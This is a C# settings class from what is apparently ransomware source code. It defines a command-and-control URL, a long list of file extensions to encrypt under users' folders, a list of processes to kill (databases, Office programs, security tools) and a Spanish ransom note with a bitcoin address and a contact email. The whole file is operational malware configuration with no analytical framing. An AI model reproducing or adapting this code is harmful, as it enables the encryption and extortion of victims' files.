namespace Main;

public static class Settables
{
	public static readonly ExecutionMode Mode = ExecutionMode.Full;

	public static readonly string URL = "http://wzl.pagekite.me/";

	public static readonly string LOGURL = "http://wzl.pagekite.me/";

	public static readonly string CONTAINMENTPATH = "C:\\Users\\";

	public static readonly int PASSLENGTH = 32;

	public static readonly byte[] SALT = Common.GetRandomBytes(1024);

	public static readonly string[] EXTENTIONS = new string[155]
	{
		".txt", ".doc", ".docx", ".log", ".msg", ".odt", ".pages", ".rtf", ".tex", ".wpd",
		".wps", ".csv", ".pdf", ".csv", ".dat", ".ged", ".key", ".keychain", ".pps", ".ppt",
		".pptx", ".sdf", ".tar", ".tax2014", ".tax2015", ".vcf", ".xml", ".aif", ".iff", ".m3u",
		".m4a", ".mid", ".mp3", ".mpa", ".wav", ".wma", ".3g2", ".3gp", ".asf", ".avi",
		".flv", ".m4v", ".mov", ".mp4", ".mpg", ".rm", ".srt", ".swf", ".vob", ".wmv",
		".3dm", ".3ds", ".max", ".obj", ".bmp", ".dds", ".gif", ".jpg", ".png", ".psd",
		".tga", ".thm", ".tif", ".tiff", ".yuv", ".ai", ".eps", ".ps", ".svg", ".indd",
		".pct", ".pdf", ".xlr", ".xls", ".xlsx", ".pptx", ".gsheet", ".hwp", ".docb", ".xlc",
		".ppsm", ".ppsx", ".chtml", ".pas", ".cab", ".accdb", ".db", ".dbf", ".mdb", ".pdb",
		".sql", ".dwg", ".dxf", ".sxc", ".ots", ".dotm", ".rdp", ".asp", ".aspx", ".cer",
		".cfm", ".csr", ".css", ".htm", ".html", ".js", ".jsp", ".php", ".rss", ".xhtml",
		".7z", ".cbr", ".deb", ".gz", ".pkg", ".rar", ".rpm", ".sitx", ".tar.gz", ".zip",
		".zipx", ".bz2", ".bin", ".cue", ".dmg", ".iso", ".mdf", ".toast", ".vcd", ".c",
		".class", ".cpp", ".cs", ".dtd", ".fla", ".h", ".java", ".lua", ".m", ".pl",
		".py", ".sh", ".sln", ".swift", ".vb", ".vcxproj", ".xcodeproj", ".bak", ".tmp", ".crdownload",
		".ics", ".msi", ".part", ".torrent", ".backup"
	};

	public static readonly string[] PROCLIST = new string[71]
	{
		"msftesql", "sqlagent", "sqlbrowser", "sqlservr", "sqlwriter", "oracle", "ocssd", "dbsnmp", "synctime", "mydesktopqos",
		"agntsvc.exeisqlplussvc", "xfssvccon", "mydesktopservice", "ocautoupds", "agntsvc.exeagntsvc", "agntsvc.exeencsvc", "firefoxconfig", "tbirdconfig", "ocomm", "mysqld",
		"mysqld-nt", "mysqld-opt", "dbeng50", "sqbcoreservice", "excel", "infopath", "msaccess", "mspub", "onenote", "outlook",
		"powerpnt", "steam", "sqlservr", "thebat", "thebat64", "thunderbird", "visio", "winword", "wordpad", "notepad",
		"lsass", "SLsvc", "FileZillaServer", "FrameworkService", "naPrdMgr", "rserver3", "sqlservr", "mysqld", "nsclient++", "TeamViewer_Service",
		"VGAuthService", "vmh", "vmtoolsd", "SQLAGENT90", "WmiPrvSE", "vmware-converter-a", "dwm", "LogMeInSystray", "UdaterUI", "TeamViewer",
		"UnlockerAssistant", "jusched", "vmtoolsd", "unsecapp", "McTray", "LMIGuardian", "FamItrfc", "wuauclt", "TrustedInstaller", "msseces",
		"tv_w32"
	};

	public static readonly string RANSOM_NOTE = " ¡Tus archivos están encriptados!\n\n\n        Sus archivos se han cifrado en esta computadora\n\n        Estos archivos se cifraron con AES-256\n\n        Posteriormente, la clave se cifró con la clave pública RSA-4096 del maestro.\n\n                TODAS LAS LLAVES ESTÁN ENCRIPTADAS EN C&C\n\n        La única forma de recuperar sus archivos es obtener la clave AES-256 pagando el rescate.\n\n\n                            COMO PAGAR\n                            \n        Tienes que pagar el rescate de $ 950 USD en bitcoins a la dirección 1BsE3Nd5ffWe8nPxB4HyCyraH3Et8rR7Zh\n\n        El valor de cambio actual de un bitcoin se puede encontrar en el enlace del sitio a continuación.\n\n        https://blockchain.info/wallet/price-of-one-bitcoin\n\n\n                            CÓMO COMPRAR BITCOINS\n                            \n        Comprar bitcoins es fácil, solo sigue las instrucciones:\n\n        Registre una cuenta con un intercambio de Bitcoin\n        @ https://www.bitstamp.net o https://btc-e.com o https://cex.io\n\n        Depositar fondos a través de una tarjeta de crédito / débito o transferencia bancaria\n\n        Retirar 950 $ en bitcoins a  1BsE3Nd5ffWe8nPxB4HyCyraH3Et8rR7Zh\n\n        Espere a que se complete la transacción.\n\n        Contáctenos bhidhizatta@protonmail.com para  Clave de descifrado especial\n       \n\n\n      ";
}
